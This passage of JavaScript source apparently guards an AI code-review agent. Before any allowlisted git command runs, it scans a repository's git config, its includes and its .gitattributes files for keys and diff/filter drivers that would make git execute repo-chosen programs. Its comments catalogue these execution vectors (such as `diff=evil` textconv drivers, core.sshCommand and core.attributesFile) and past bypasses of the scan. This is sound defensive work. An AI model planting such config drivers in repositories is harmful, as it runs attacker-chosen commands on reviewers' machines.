      const rel = path.relative(fs.realpathSync(root), real);
      return rel !== "" && !rel.startsWith("..") && !path.isAbsolute(rel);
    } catch { return false; }
  });
  if (!inside) return null;
  // Real git config/attributes files are a few KiB. A bigger one is not metadata
  // anyone reviews by eye, so it is refused OUT LOUD rather than skipped: a
  // silently-ignored file would still drive git on the reviewer's first command.
  if (st.size > MAX_REPO_METADATA_BYTES) {
    return {
      refusal: `file is ${st.size} bytes, over the ${MAX_REPO_METADATA_BYTES}-byte limit for repository git metadata (a real config/attributes file is small) — refusing to read it; shrink or remove it, or review a copy of the repository`,
    };
  }
  try { return { text: fs.readFileSync(real, "utf8") }; } catch { return null; }
}

/**
 * `.git/config` plus anything it `[include]s` — an include is repo content too:
 * a repo-relative path can walk to any file in the worktree, and git reads it.
 * Every read goes through readRepoFile, so a symlink/FIFO include cannot freeze
 * the scan and an include cannot reach outside the tree that owns it. Returns
 * { files: [{file,label,text}], refusals: [...] } — a refusal means metadata too
 * large to read safely, and the caller refuses the review.
 */
function repoConfigFiles(repoPath) {
  const files = [];
  const refusals = [];
  const seen = new Set();
  const gitDir = path.join(repoPath, ".git");
  // `roots` = the tree a config file must really live in. For a normal repo that
  // is the worktree; for a worktree's `.git` pointer it is the gitdir the pointer
  // names (a worktree gitdir lives outside the worktree by design).
  const walk = (file, label, depth, roots) => {
    // Include chains deeper than this are exotic; the cap bounds the read count
    // (seen dedupes) while still following nested includes several levels in,
    // so a live driver cannot hide behind extra indirection.
    if (depth > 5 || seen.has(file)) return;
    seen.add(file);
    // followSymlink: git follows a symlinked .git/config or [include] target, and
    // executes whatever driver the target defines — verified — so the scan must
    // follow the same links (still only to a regular file inside the tree).
    const read = readRepoFile(file, roots, { followSymlink: true });
    if (!read) return; // missing, or not repository-controlled content
    if (read.refusal) { refusals.push(`${label}: ${read.refusal}`); return; }
    files.push({ file, label, text: read.text });
    const base = path.dirname(file); // readRepoFile only ever returns a regular file
    // The optional bracket part matches a header sharing its line with the key —
    // `[include] path = ../inc` is the same include as `[include]` + `path = ../inc`,
    // and git follows it, so the walk must too (P0-5).
    for (const m of read.text.matchAll(/^\s*(?:\[[^\]]*\]\s*)?path\s*=\s*(.+?)\s*$/gim)) {
      const raw = m[1].trim().replace(/^["']|["']$/g, "");
      if (!raw || raw.startsWith("~/")) continue; // ~ is the user's own config, not repo-controlled
      // Same pre-spawn hazard as core.attributesFile: the readRepoFile() inside
      // walk() calls lstatSync, which blocks on a UNC target with no timeout
      // (network I/O cannot be cancelled while the event loop is stuck). Git
      // would read config from a location this scan cannot verify, and that
      // config can define any executable key, so refuse instead of probing.
      // The value here is RAW file text, not git's unescaped value: git writes
      // each backslash as \\, so a UNC path arrives as four leading
      // backslashes. Unescape a COPY only for detection — the walk keeps using
      // the original spelling so non-UNC paths behave exactly as before.
      const unescaped = raw.replace(/\\\\/g, "\\");
      if (isUncPath(raw) || isUncPath(unescaped)) {
        refusals.push(label + ": [include] path = " + raw.slice(0, 120) +
          " is a UNC path; a UNC path cannot be verified without network I/O (probing it can block this pre-spawn scan), " +
          "so the included config cannot be scanned; remove the include or review a local copy of the repository");
        continue;
      }
      walk(path.isAbsolute(raw) ? raw : path.resolve(base, raw), `${label} -> include`, depth + 1, roots);
    }
  };
  let st = null;
  try { st = fs.lstatSync(gitDir); } catch { /* no .git: nothing repo-controlled to scan */ }
  // A symlinked .git is followed like git follows it (user setup, not cloned
  // content). A link to a FIFO/device is not a directory, so it falls through to
  // the read-guarded pointer-file branch below instead of being stat'd forever.
  if (st && st.isSymbolicLink()) {
    try { st = fs.statSync(gitDir); } catch { st = null; }
  }
  if (st && st.isDirectory()) {
    walk(path.join(gitDir, "config"), ".git/config", 0, [repoPath, gitDir]);
  } else if (st) {
    // A worktree (or submodule): .git is a FILE "gitdir: <path>". The real
    // config lives in the gitdir — scanning the pointer file scans nothing.
    // git follows a symlinked .git pointer file too (verified): read the resolved
    // regular file, so `.git -> ptr` cannot hide the gitdir config from the scan.
    const pointer = readRepoFile(gitDir, repoPath, { followSymlink: true });
    if (pointer?.refusal) refusals.push(`.git: ${pointer.refusal}`);
    const m = pointer?.text ? /^gitdir:\s*(.+)$/m.exec(pointer.text) : null;
    if (m) {
      // Submodules carry a RELATIVE gitdir (`gitdir: ../.git/modules/sub`)
      // resolved against the superproject (= repoPath here) — resolve against
      // it, never against this server's cwd.
      const real = path.resolve(repoPath, m[1].trim());
      const roots = [repoPath, real];
      walk(path.join(real, "config"), `${path.basename(repoPath)}/.git -> gitdir/config`, 0, roots);
      const wtCfg = path.join(real, "config.worktree");
      if (fs.existsSync(wtCfg)) walk(wtCfg, `${path.basename(repoPath)}/.git -> config.worktree`, 0, roots);
      // By default `git config` inside a worktree writes the COMMON config; the
      // gitdir's `commondir` file names it (relative to the gitdir).
      const cdRead = readRepoFile(path.join(real, "commondir"), real);
      const cd = cdRead?.text ? cdRead.text.trim() : "";
      if (cd) {
        // The common dir is the main repo's .git — outside the worktree and
        // outside the worktree gitdir, but named by repo-controlled metadata.
        const commonDir = path.resolve(real, cd);
        walk(path.join(commonDir, "config"), `${path.basename(repoPath)}/.git -> commondir/config`, 0, [...roots, commonDir]);
      }
    }
  }
  return { files, refusals };
}

/**
 * Attribute files that can name a driver.
 *
 * Git applies `.gitattributes` per directory, so a driver reference in
 * `src/deep/.gitattributes` activates a repo-defined textconv for the reviewer's
 * `git diff` exactly like the root file does — the old "root + one directory
 * deep" scan never looked, so depth>=2 references were invisible (P0-4). The walk
 * is bounded (depth and file count) so an adversarial tree cannot turn this
 * pre-spawn scan into a denial of service of its own. Same
 * { files, refusals } shape as repoConfigFiles, plus notes for sources that
 * provably cannot run anything here (a dead core.attributesFile path).
 */
const MAX_ATTR_DEPTH = 16;
const MAX_ATTR_FILES = 4000;
function repoAttributeFiles(repoPath, attributeSources = []) {
  const files = [];
  const refusals = [];
  // Dead paths and other provably-inert sources are notes, not refusals.
  const notes = [];
  const seenRels = new Set();
  let seen = 0;
  // A truncated walk is a hole, not a performance detail: an attribute file the
  // scan never read can still name a live driver, and git would execute it from
  // an allowlisted `git diff`. So hitting either bound refuses the review instead
  // of quietly scanning "most" of the tree.
  let truncated = false;
  // `followSymlink` is true only for .git/info/attributes: git re-reads that
  // through a link (verified to execute a textconv), while worktree .gitattributes
  // is opened with O_NOFOLLOW, so a symlinked one there is inert and is skipped.
  const add = (rel, followSymlink = false) => {
    if (seenRels.has(rel)) return; // the root file is added explicitly AND seen by the walk
    seenRels.add(rel);
    const read = readRepoFile(path.join(repoPath, rel), repoPath, { followSymlink });
    if (!read) return;
    if (read.refusal) { refusals.push(rel + ": " + read.refusal); return; }
    files.push({ file: path.join(repoPath, rel), label: rel, text: read.text });
  };
  // The worktree root plus git's own per-repo file (not cloned, but a zip can ship it).
  add(".gitattributes");
  add(path.join(".git", "info", "attributes"), true);
  // P0-9: core.attributesFile is git's THIRD attributes source, and the only one
  // a repository can point at a file it fully controls — yet the scan used to
  // read just the two well-known files. Git applies that file on every diff/log,
  // so a driver it names executes exactly like one named by .gitattributes.
  // Only a PLAIN file inside the worktree is repository content that can be read
  // and attributed safely; anything else is refused out loud, never skipped.
  for (const { label, value } of attributeSources) {
    const raw = String(value || "").trim().replace(/^["']|["']$/g, "");
    if (!raw) continue; // empty value: git reads no extra attributes file
    // The line-scan fallback passes RAW config text, where git escapes every
    // backslash (`\\\\server\share`), so the UNC test covers both the
    // normalized value and the unescaped spelling before any fs call.
    if (isUncPath(raw) || isUncPath(raw.replace(/\\\\/g, "\\"))) {
      // Refuse BEFORE resolving or probing. On Windows the existsSync below is a
      // synchronous SMB round trip with no timeout (~21s against a dead share),
      // and on POSIX the `//host` spelling can still reach a network mount. The
      // file is also unverifiable either way: a share that answers can hand back
      // attributes naming a live driver, and one that does not says nothing.
      refusals.push(label + ": core.attributesFile = " + raw.slice(0, 120) +
        " is a UNC path; a UNC path cannot be verified without network I/O (probing it can block this pre-spawn scan), " +
        "so the attribute file cannot be scanned for driver references. Point core.attributesFile at a file inside the " +
        "repository or remove the key (git config --unset core.attributesFile)");
      continue;
    }
    const resolved = raw.startsWith("~/") ? path.join(os.homedir(), raw.slice(2)) : raw;
    const abs = path.isAbsolute(resolved) ? resolved : path.resolve(repoPath, resolved);
    if (!fs.existsSync(abs)) {
      // A path from another machine (or a stale relative one) is inert: git
      // reads nothing, so this is a note, not a refusal.
      notes.push(label + ": core.attributesFile = " + raw.slice(0, 120) +
        " does not exist on this machine, so git reads no attributes file from it; proceeding");
      continue;
    }
    let inside = false;
    try {
      const relToRoot = path.relative(fs.realpathSync(repoPath), fs.realpathSync(abs));
      inside = relToRoot !== "" && !relToRoot.startsWith("..") && !path.isAbsolute(relToRoot);
    } catch { inside = false; }
    if (!inside) {
      refusals.push(label + ": core.attributesFile = " + raw.slice(0, 120) +
        " points outside the repository — git applies attributes from that file on every diff/log, so a driver " +
        "it names cannot be verified. Point it at a file inside the tree, or remove the key from .git/config " +
        "(git config --unset core.attributesFile)");
      continue;
    }
    const rel = path.relative(repoPath, path.resolve(abs));
    if (seenRels.has(rel)) continue;
    const read = readRepoFile(abs, repoPath, { followSymlink: true });
    if (!read) {
      refusals.push(label + ": core.attributesFile = " + raw.slice(0, 120) +
        " is not a regular file inside the repository (directory, FIFO/device, or a link out of the tree) — git " +
        "would read it as attributes, so it cannot be verified; replace it with a plain file or remove the key");
      continue;
    }
    if (read.refusal) { refusals.push(label + ": " + read.refusal); continue; }
    seenRels.add(rel);
    files.push({ file: abs, label: rel, text: read.text });
  }
  const walk = (dirRel, depth) => {
    if (depth > MAX_ATTR_DEPTH || seen >= MAX_ATTR_FILES) { truncated = true; return; }
    let entries;
    try { entries = fs.readdirSync(path.join(repoPath, dirRel), { withFileTypes: true }); } catch { return; }
    for (const e of entries) {
      // .git (also a FILE in a worktree) and node_modules are never reviewed
      // content; descending them would only slow the pre-spawn scan down.
      if (e.name === ".git" || e.name === "node_modules") continue;
      const rel = dirRel ? path.join(dirRel, e.name) : e.name;
      // A symlinked directory is not descended: readdir reports the link itself,
      // so a link can never lead the walk outside the repository tree.
      if (e.isDirectory()) { walk(rel, depth + 1); continue; }
      if (e.name !== ".gitattributes") continue;
      // Hard cap, checked BEFORE the read: an adversarial tree cannot make this
      // pre-spawn scan read an unbounded number of files. Hitting it HERE must
      // fail closed too — this return used to leave truncated false, so the walk
      // stopped "most" of the way through and the review still proceeded (P0-10).
      if (seen >= MAX_ATTR_FILES) { truncated = true; return; }
      seen++;
      add(rel);
    }
  };
  walk("", 0);
  if (truncated) {
    refusals.push(
      "the repository tree is deeper than " + MAX_ATTR_DEPTH + " directories or has more than " + MAX_ATTR_FILES +
      " .gitattributes files, so every attribute file could not be verified — a driver reference hidden past " +
      "the scan bound would run a repo-chosen command from an allowlisted git read. Review a copy with a " +
      "shallower tree, or remove the excess attribute files.",
    );
  }
  return { files, refusals, notes };
}

/**
 * Does the repository's own git config / attributes try to run a program?
 *
 * `-c` overrides neutralise the keys we know about, but .gitattributes can name
 * an arbitrary filter driver (`*.foo diff=evil`), and `diff.evil.command` then
 * executes. That surface cannot be closed with `-c`, so it is refused instead.
 *
 * The keys are read as GIT normalizes them (`git config --file <cfg> --list -z`
 * per already-validated config file), not matched line by line: a line table
 * cannot model case-insensitive names, quoting, comments, dotted subsections or
 * same-line section headers, which is exactly how `core.sshCommand` (P0-8) and
 * `core.attributesFile` (P0-9) stayed invisible while git executed them. The
 * line scan survives only as the fallback for hosts without a usable git.
 *
 * Liveness-aware (v1.7.0): a config value whose path provably does not exist on
 * THIS machine — typically an absolute path that arrived from another OS via a
 * full-folder copy or a moved clone (`core.hooksPath = /Users/kent/...` on
 * Windows) — cannot execute anything, so it becomes a note, not a refusal.
 * `core.hooksPath` is a note even when live: git hooks fire on mutating
 * operations (commit/merge/rebase/...), none of which the review allowlist
 * grants, and this server's own git calls neutralise the key via
 * `-c core.hooksPath=` anyway.
 *
 * Returns { refusals: [...], notes: [...] } — the caller refuses on refusals
 * and surfaces notes in the report.
 */
export function repoRunsGitPrograms(repoPath) {
  const notes = [];
  const configs = repoConfigFiles(repoPath);
  // Oversized repo metadata is a refusal, not a note: we could not read it, so
  // we cannot vouch that it does not run a program (see readRepoFile).
  const refusals = [...configs.refusals];

  // Split a config file's text into sections keyed by header, so a driver's
  // command lines can be attributed to that driver for the attributes cross-check.
  // A git-config header may SHARE its line with the first key — `[diff "evil"]
  // textconv = cmd` is valid git config and `git diff` executes it — so the
  // text after the closing bracket belongs to the NEW section and is re-emitted as
  // one of its lines. The old header regex demanded a line of its own, so that
  // line was attributed to the PREVIOUS section (and, when that was a dead
  // driver, `continue`d as harmless): the driver was never registered and its
  // command never scanned (P0-5). Fallback path only — the normalized path below
  // gets sections from git itself.
  const sectionsOf = (text) => {
    const out = [];
    let cur = { header: null, lines: [] };
    for (const line of text.split(/\r?\n/)) {
      const h = /^\s*\[\s*([^\]]+?)\s*\]\s*(.*)$/.exec(line);
      if (h) {
        out.push(cur);
        cur = { header: h[1], lines: [] };
        // `[core] # note` is a valid header-only line; only real content joins.
        if (h[2] && !/^\s*[#;]/.test(h[2])) cur.lines.push(h[2]);
      } else {
        cur.lines.push(line);
      }
    }
    out.push(cur);
    return out;
  };

  // value side of any `key = value` line, quotes stripped
  const rhs = (line) => {
    const m = /^[^=]*=\s*(.*)$/.exec(line);
    return m ? m[1].trim().replace(/^["']|["']$/g, "") : null;
  };

  // driver name -> does its section (across ALL config files) carry a LIVE command?
  const driverLive = new Map();
  // core.attributesFile values: git's third attributes source, scanned below (P0-9).
  const attributeSources = [];

  const shownKey = (label, key, value) => label + ": " + key + " = " + String(value ?? "").trim().slice(0, 120);

  // A value git would EXECUTE. A dead absolute path (a config copied from another
  // machine) cannot run anything, so it is a note: that is what keeps a clone
  // carrying the previous owner's paths reviewable.
  // Why THIS key runs a program. The model needs the consequence, not just the
  // key name, to choose between removing the key and trusting the repository.
  const execReason = (key) => {
    if (CONFIG_PAGER_KEY.test(key)) return "it is run as the pager for that subcommand";
    if (key === "core.askpass") return "it is run to answer a credential challenge";
    if (key === "sequence.editor") return "it is run as the editor for interactive rebase";
    return null;
  };

  const refuseCommand = (label, key, value) => {
    const line = shownKey(label, key, value);
    if (deadPathOnThisMachine(value, repoPath)) {
      notes.push(line + " — path does not exist on this machine (stale cross-machine config); cannot execute, proceeding");
      return;
    }
    // Actionable for the model: name the exact key and the exact undo command.
    // The label prefixes the line, so "that config file" is unambiguous even
    // when the key came from an [include] target.
    const why = execReason(key);
    refusals.push(line + " — git executes this value" + (why ? " (" + why + ")" : "") +
      "; remove the key from that config file (git config --unset " + key +
      " when it is .git/config) or review a copy of the repository without it");
  };

  const noteHooksPath = (label, value) => {
    notes.push(shownKey(label, "core.hooksPath", value) + (deadPathOnThisMachine(value, repoPath)
      ? " — hooksPath points at a path that does not exist on this machine (stale cross-machine config); ignored"
      : " — noted, not refused: git hooks fire only on mutating operations, which the review allowlist never grants; this server's own git calls also neutralise core.hooksPath via -c"));
  };

  // One key/value pair as git normalized it (section and variable lowercased).
  const scanKey = (label, key, value) => {
    const val = value === null ? "" : String(value);
    if (key === CONFIG_HOOKS_PATH_KEY) { noteHooksPath(label, val); return; }
    if (CONFIG_INCLUDE_PATH_KEY.test(key)) {
      const raw = val.trim();
      if (!raw || raw.startsWith("~/")) return; // ~ is the user's own config, not repo-controlled
      // The include itself is not execution; repoConfigFiles() already walked a
      // readable target and its contents are evaluated like any other config.
      // A dead target is a git no-op (git silently ignores unreadable includes).
      if (deadPathOnThisMachine(raw, repoPath)) {
        notes.push(shownKey(label, key, raw) + " — include target does not exist on this machine; git ignores it");
      }
      return;
    }
    // Not a command but a PATH git reads as attributes: collected here and
    // resolved by repoAttributeFiles (P0-9).
    if (key === CONFIG_ATTR_FILE_KEY) { attributeSources.push({ label, value: val }); return; }
    const dm = CONFIG_DRIVER_KEY.exec(key);
    if (dm) {
      // A named driver only executes when an attributes file references it, so
      // an unreferenced definition is inert (see the cross-check below). An
      // EMPTY command is inert even when referenced — git has nothing to run.
      if (!val.trim()) return;
      const name = dm[2].toLowerCase();
      if (deadPathOnThisMachine(val, repoPath)) {
        if (!driverLive.has(name)) driverLive.set(name, false);
      } else {
        driverLive.set(name, true);
      }
      return;
    }
    if (!CONFIG_EXEC_KEYS.has(key) && !CONFIG_PAGER_KEY.test(key) &&
        !CONFIG_CREDENTIAL_HELPER.test(key) && !CONFIG_MERGE_DRIVER.test(key)) return;
    const trimmed = val.trim();
    if (!trimmed) return; // an empty value neutralises the key; it runs nothing
    // core.fsmonitor accepts a boolean: true means git's built-in monitor.
    if (key === "core.fsmonitor" && CONFIG_BOOLEAN.test(trimmed)) return;
    // pager.<cmd> has the same boolean form (verified on git 2.54): false
    // disables the pager, true/no value uses the default — no program runs, so
    // refusing these would be a false positive on an ordinary config.
    if (CONFIG_PAGER_KEY.test(key) && CONFIG_BOOLEAN.test(trimmed)) return;
    // core.gitProxy's documented "none" form DISABLES the proxy; it runs nothing.
    if (key === "core.gitproxy" && /^none(\s|$)/i.test(trimmed)) return;
    refuseCommand(label, key, trimmed);
  };

  for (const { file, label, text } of configs.files) {
    // Primary path: git itself normalizes this file, so case, quoting, comments,
    // dotted subsections and same-line section headers cannot hide a key. Scoped
    // to the file repoConfigFiles() already validated (the include graph is
    // walked and labeled there), so every finding keeps its own label.
    const entries = normalizedConfigEntries(file, repoPath);
    if (entries) {
      for (const { key, value } of entries) scanKey(label, key, value);
      continue;
    }
    // Fallback: no usable git, or this file is not parseable. The line scan knows
    // less (the camel-case keys are matched explicitly in CONFIG_CMD_PATTERNS),
    // but it must never skip the file.
    for (const sec of sectionsOf(text)) {
      // Three legal spellings name a driver: [diff "evil"], [diff.evil] (dotted,
      // equivalent per git-config), and the filter twin. Only the quoted form used
      // to be recognised, so a dotted header registered nothing and the attributes
      // cross-check silently passed.
      const dm = /^\s*(?:diff|filter)\s*(?:"([^"]+)"|\.([\w.-]+))\s*$/i.exec(sec.header || "");
      const dmName = dm ? (dm[1] || dm[2]) : null;
      // Plain section name (`[pager]`, `[core]`, `[sequence]`). The normalized
      // path receives full dotted keys from git; this fallback only sees the
      // variable name on each line, so the section must be folded back in for
      // the keys whose execution meaning lives in the dotted name.
      const secName = /^\s*([A-Za-z0-9][\w-]*)\s*$/.exec(sec.header || "")?.[1]?.toLowerCase() ?? null;
      for (const line of sec.lines) {
        const trimmed = line.trim();
        if (!trimmed) continue;
        // git config comments: # or ; to end of line — never executable
        if (/^\s*[#;]/.test(line)) continue;
        // The third attributes source is a PATH: collect it, do not judge it.
        const af = /^\s*attributesfile\s*=\s*(.+?)\s*$/i.exec(line);
        if (af) { attributeSources.push({ label, value: af[1].replace(/^["']|["']$/g, "") }); continue; }
        const hp = valueOf(line, HOOKS_PATH);
        if (hp) { noteHooksPath(label, hp); continue; }
        const inc = INCLUDE_PATH.exec(line);
        if (inc && /^include/i.test(sec.header || "")) {
          const raw = inc[1].trim().replace(/^["']|["']$/g, "");
          if (!raw || raw.startsWith("~/")) continue;
          if (deadPathOnThisMachine(raw, repoPath)) notes.push(label + ": " + trimmed.slice(0, 120) + " — include target does not exist on this machine; git ignores it");
          continue;
        }
        // core.gitProxy's "none" form disables the proxy; it runs nothing. The
        // normalized path handles this explicitly; keep the fallback honest too.
        if (/^\s*gitproxy\s*=\s*none(\s|$)/i.test(line)) continue;
        // pager.<cmd> / core.askPass / sequence.editor in their normal section
        // form. A line pattern cannot rebuild `pager.<cmd>` from `[pager]` +
        // `log = ...`, and `[pager] log = ...` (header sharing the line) lands
        // here too, so the full key is derived from the section instead.
        const kv = /^\s*([A-Za-z0-9][\w-]*)\s*=\s*(.*)$/.exec(line);
        if (kv && secName) {
          const varName = kv[1].toLowerCase();
          const fullKey = secName === "pager" ? "pager." + varName
            : secName === "sequence" && varName === "editor" ? "sequence.editor"
            : secName === "core" && varName === "askpass" ? "core.askpass"
            : null;
          if (fullKey) {
            const val = kv[2].trim().replace(/^["']|["']$/g, "");
            // Same liveness rule as the normalized path: an empty value runs
            // nothing, a pager boolean is git's enable/disable form, a dead
            // absolute path cannot execute here, everything else is a refusal.
            if (val && !(CONFIG_PAGER_KEY.test(fullKey) && CONFIG_BOOLEAN.test(val))) {
              refuseCommand(label, fullKey, val);
            }
            continue;
          }
        }
        if (!isCmdLine(line)) continue;
        const val = rhs(line) ?? "";
        if (dmName) {
          const name = dmName.toLowerCase();
          if (!deadPathOnThisMachine(val, repoPath)) driverLive.set(name, true);
          else if (!driverLive.has(name)) driverLive.set(name, false);
          continue;
        }
        if (!val.trim()) continue;
        if (deadPathOnThisMachine(val, repoPath)) {
          notes.push(label + ": " + trimmed.slice(0, 120) + " — path does not exist on this machine (stale cross-machine config); cannot execute, proceeding");
        } else {
          refusals.push(label + ": " + trimmed.slice(0, 120) + " — git executes this value; remove it from that config file or review a copy of the repository without it");
        }
      }
    }
    // No trailing `$`: the header may share its line with the first key, and a
    // driver whose section was only ever seen that way must still be registered,
    // or a .gitattributes reference to it would be silently ignored (P0-5).
    for (const m of text.matchAll(/^\s*\[\s*(?:diff|filter)\s*(?:"([^"]+)"|\.([\w.-]+))\s*\]/gim)) {
      const name = (m[1] || m[2]).toLowerCase();
      if (!driverLive.has(name)) driverLive.set(name, false);
    }
  }

  const attrs = repoAttributeFiles(repoPath, attributeSources);
  // An attribute file too large to read is a refusal: not reading it means not
  // knowing which driver it activates (see readRepoFile).
  refusals.push(...attrs.refusals);
  notes.push(...attrs.notes);
  for (const { label: aLabel, text: aText } of attrs.files) {
    // EVERY driver reference on EVERY line matters (H2): stopping at the first
    // match let a live driver hide behind a dead one listed earlier.
    for (const line of aText.split(/\r?\n/)) {
      for (const m of line.matchAll(/\b(?:diff|filter)\s*=\s*([\w.-]+)/gi)) {
        const live = driverLive.get(m[1].toLowerCase()) === true;
        const shown = aLabel + ": " + line.trim().slice(0, 120) + " (driver \"" + m[1] + "\" is defined in the repo's git config)";
        if (live) refusals.push(shown);
        else if (driverLive.has(m[1].toLowerCase())) notes.push(shown + " — the driver's command points at a path that does not exist on this machine; cannot execute, proceeding");
      }
    }
  }
  return { refusals, notes };
}

/** Cheap async git preflight: does the repo have commits / uncommitted work? */
/** JSONL journals a live/finished job still references — retention must not
 *  delete these while their result can still be read. Process-lifetime. */
export const activeSubagentFiles = new Set();

export async function gitPreflight(repoPath) {
  const run = (args) => execFileAsync("git", [...GIT_HARDENING_ARGS, ...args], gitSpawnOpts(repoPath))
    .then((r) => ({ ok: true, out: r.stdout }))
    .catch((e) => ({ ok: false, err: e }));
  const head = await run(["rev-parse", "--verify", "HEAD"]);
  if (head.ok) {
    // A root commit has no parent: a "review the last commit" target cannot be
    // expressed as a base ref for claude's built-in command, so the caller
    // needs to know.
    const parent = await run(["rev-parse", "--verify", "--quiet", "HEAD~1"]);
    return { hasCommits: true, hasParent: parent.ok, dirty: null };
  }
  const status = await run(["status", "--porcelain"]);
  const dirty = status.ok && status.out.trim().length > 0;
  // status failing (not "empty") must surface its own error, not rev-parse's
  // No HEAD at all (fresh repo): the native command targets a BASE ref, so the
  // caller must treat this exactly like a root commit.
  return { hasCommits: false, hasParent: false, dirty, gitError: !status.ok ? (status.err ?? head.err) : null };
}
